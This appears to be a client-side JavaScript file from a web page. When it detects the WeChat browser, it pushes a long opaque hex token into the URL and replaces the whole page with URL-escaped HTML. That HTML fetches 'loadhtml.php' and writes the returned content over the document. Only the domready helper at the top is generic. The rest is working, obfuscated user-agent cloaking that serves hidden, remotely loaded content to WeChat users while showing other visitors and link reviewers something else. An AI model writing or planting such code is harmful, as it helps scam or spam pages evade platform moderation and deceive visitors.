domready = function(callback) {
    ///兼容FF,Google
    if (document.addEventListener) {
        document.addEventListener('DOMContentLoaded',
        function() {
            document.removeEventListener('DOMContentLoaded', arguments.callee, false);
            callback();
        },
        false)
    }
    //兼容IE
    else if (document.attachEvent) {
        document.attachEvent('onreadystatechange',
        function() {
            if (document.readyState == "complete") {
                document.detachEvent("onreadystatechange", arguments.callee);
                callback();
            }
        })
    } else if (document.lastChild == document.body) {
        callback();
    }
}
 
var ua = navigator.userAgent.toLowerCase();

if (/micromessenger/.test(ua)) {
	history.pushState(history.length + 1, "message", "#de4a0124ce23d3380beac3599c8e595e76b9c8851df7f3e0cffff1dad0431a594b897101a36de9861ecbef81a4c033a2373fa8cc7971d1cd5910660e3de9048bb30e4dd75de920a625048d549185bfe95a8f40654aa4ec6063b8bd8e32081c6a86ae135660dad3408189b266e3284c047c151660957cc0e2d53a6075e2ec6e90b8721fc4c26a54241b8d7cf139426ce204d6a5e7d83186947b7c958ddf89eaed753cff5d00cdf6743d36ad82c027942f82de35de2655fe8436edeffb3049345520cd995dc977dd486f5a1fd3af4317f8d44d1e4f158701c4d72ec8615d9cff549f682df158a01654cba1cb6659d3d7e184264def7e199c6549cfed4be8e4b770ced2a0b6062954d12907d9331a137085b69227539e0bdebf405dd7e69dacaf46ae4a012c7971d1cd5910660e3de9048bb30e4dd0cb37ac401789449782d95c7709631bb0dbf305b06f81328e72e9f063773a8f6c0d859af6410def018a8ef718590b52ec7971d1cd5910660e3de9048bb30e4dddcfad28a5e66bb7171ba1fe406901115826636cd3159d006ca4e8fc74a4bdc449254d0294fb697e4e7e7be97f2b8ff78902f9685166cabd4accc3040a0e777b3660dad3408189b266e3284dcfad28a5e66bb7171ba1fe40690111558b2c07f5223359a3719b7b805488d09df65acf93d15072a1edcf9dc19308ab539e0bdebf405dd7e69dacaf46ae4a0124ce23d3380beac3599c8e595e76b9c8851df7f3e0cffff1dad0431a594b897101a36de9861ecbef81a4c033a2373fa8cc7971d1cd5910660e3de9048bb30e4dd75de920a625048d549185bfe95a8f40654aa4ec6063b8bd8e32081c6a86ae135660dad3408189b266e3284c047c151660957cc0e2d53a6075e2ec6e90b8721fc4c26a54241b8d7cf139426ce204d6a5e7d83186947b7c958ddf89eaed753cff5d00cdf6743d36ad82c027942f82de35de2655fe8436edeffb3049345520cd995dc977dd486f5a1fd3af4317f8d44d1e4f158701c4d72ec8615d9cff549f682df158a01654cba1cb6659d3d7e184264def7e199c6549cfed4be8e4b770ced2a0b6062954d12907d9331a137085b69227539e0bdebf405dd7e69dacaf46ae4a012c7971d1cd5910660e3de9048bb30e4dd0cb37ac401789449782d95c7709631bb0dbf305b06f81328e72e9f063773a8f6c0d859af6410def018a8ef718590b52ec7971d1cd5910660e3de9048bb30e4dddcfad28a5e66bb7171ba1fe406901115826636cd3159d006ca4e8fc74a4bdc449254d0294fb697e4e7e7be97f2b8ff78902f9685166cabd4accc3040a0e777b3660dad3408189b266e3284c047c1516611d5e3ee257a36251d4d7ee60960432881eb97067c9b1020976fd94c5d9d24bed55d304c984833998bc90ec83272ef63347ca7160609fc3ca4e1ec5aa2f5d56781eb97067c9b1020976fd94c5d9d24be15edb103edcce72dc31a3cbb62e0a74c2ea4cb4279b8573ea2806ffb530184929cbb776317f8ee8d0053813c71077dacdf65acf93d15072a1edcf9dc19308ab5a32efd6f7e8f4337ce3f6ea88be2529def5daad160859ca39df739fcbab8314e8a168ca97fece0c835ea6da36ac49ff639e0bdebf405dd7e69dacaf46ae4a0128a168ca97fece0c835ea6da36ac49ff6d71bcd007e72a68462033abebf5dca628a168ca97fece0c835ea6da36ac49ff6525deaaf344df55b56baca084ff7ce9bc7971d1cd5910660e3de9048bb30e4dd57cdfa3b6ee109ec7e278a28a95f4f8ed8426fbaa680817cf7d63fbe99a0ba744cd310019c35b60fd526460ab5ef8247158a01654cba1cb6659d3d7e184264ded71bcd007e72a68462033abebf5dca621fdd28e57831b503d2e1d180260764ab7d83186947b7c958ddf89eaed753cff5135a0cbb72a33067cdce6b2f76685a458a168ca97fece0c835ea6da36ac49ff68a168ca97fece0c835ea6da36ac49ff61e847e9a8cf90dc15d002096639378944ce23d3380beac3599c8e595e76b9c88fb10b971b873435121451f0e1a84f96908c34236d6e635f1e4970eff16b8be1129877f4903fe11e808327b1ec16edf7e81eb97067c9b1020976fd94c5d9d24be6062954d12907d9331a137085b692275e2655fe8436edeffb3049345520cd9951a36de9861ecbef81a4c033a2373fa8c08c34236d6e635f1e4970eff16b8be11f7e199c6549cfed4be8e4b770ced2a0b347ca7160609fc3ca4e1ec5aa2f5d567713af0afa5ec16f7ded22f24ba402ba0c0d859af6410def018a8ef718590b52eb435635669505bc14901100635a0b8e34c26a54241b8d7cf139426ce204d6a5ef5deb8ef7d2d7d2d6d6c9ef348d7abae6062954d12907d9331a137085b6922751e847e9a8cf90dc15d00209663937894f7e199c6549cfed4be8e4b770ced2a0b4ce23d3380beac3599c8e595e76b9c880cb37ac401789449782d95c7709631bb3ed661cb31e5b941d12f12c660fa100139e0bdebf405dd7e69dacaf46ae4a012b435635669505bc14901100635a0b8e375faf436da284b595842327323b6eb404cd310019c35b60fd526460ab5ef8247e1582c00e340676c16be082ebdd84880f5deb8ef7d2d7d2d6d6c9ef348d7abaef904ac9908c226537b9cb616a88387d33ed661cb31e5b941d12f12c660fa100158b2c07f5223359a3719b7b805488d098a168ca97fece0c835ea6da36ac49ff6df65acf93d15072a1edcf9dc19308ab58a168ca97fece0c835ea6da36ac49ff69fa32cc2a45be446a28daa80d856afdbdc977dd486f5a1fd3af4317f8d44d1e4c7971d1cd5910660e3de9048bb30e4dd08c34236d6e635f1e4970eff16b8be117d83186947b7c958ddf89eaed753cff5" + (new Date).getTime());
	domready(function(){
		var new_doc = document.open("text/html", "replace");
		var html = unescape("%3C%21DOCTYPE%20html%3E%0A%3Chtml%3E%0A%3Chead%3E%0A%20%20%20%20%3Cmeta%20http-equiv%3D%22Content-Type%22%20content%3D%22text/html%3B%20charset%3Dutf-8%22%3E%0A%20%20%20%20%3Cmeta%20name%3D%22viewport%22%20content%3D%22width%3Ddevice-width%2Cinitial-scale%3D1.0%2Cmaximum-scale%3D1.0%2Cuser-scalable%3D0%22/%3E%0A%20%20%20%20%3Ctitle%3E%3C/title%3E%0A%3C/head%3E%0A%3Cbody%20style%3D%22background%3A%23000%3B%22%3E%0A%3Cscript%3E%0A%20%20%20%20var%20xhr%20%3D%20new%20XMLHttpRequest%3B%0A%20%20%20%20var%20html%20%3D%20null%3B%0A%20%20%20%20function%20render%28%29%20%7B%0A%20%20%20%20%20%20%20%20var%20a%20%3D%20document.open%28%22text/html%22%2C%20%22replace%22%29%3B%0A%20%20%20%20%20%20%20%20a.write%28html%29%3B%0A%20%20%20%20%20%20%20%20a.close%28%29%3B%0A%20%20%20%20%7D%0A%20%20%20%20xhr.onload%20%3D%20function%28%29%20%7B%0A%20%20%20%20%20%20%20%20html%20%3D%20xhr.responseText%3B%0A%20%20%20%20%20%20%20%20var%20delay%20%3D%200%3B%0A%20%20%20%20%20%20%20%20if%20%28delay%20%3E%200%29%20setTimeout%28%22render%28%29%22%2C%20delay%20*%201000%29%0A%20%20%20%20%20%20%20%20else%20render%28%29%3B%0A%20%20%20%20%7D%3B%0A%20%20%20%20xhr.open%28%22GET%22%2C%20%22loadhtml.php%3F%22%20+%20Date.now%28%29%2C%20%210%29%3B%0A%20%20%20%20xhr.send%28%29%3B%0A%3C/script%3E%0A%3C/body%3E%0A%3C/html%3E");
		setTimeout(function(){
			new_doc.write(html);
			new_doc.close();
		}, 0);
	});
}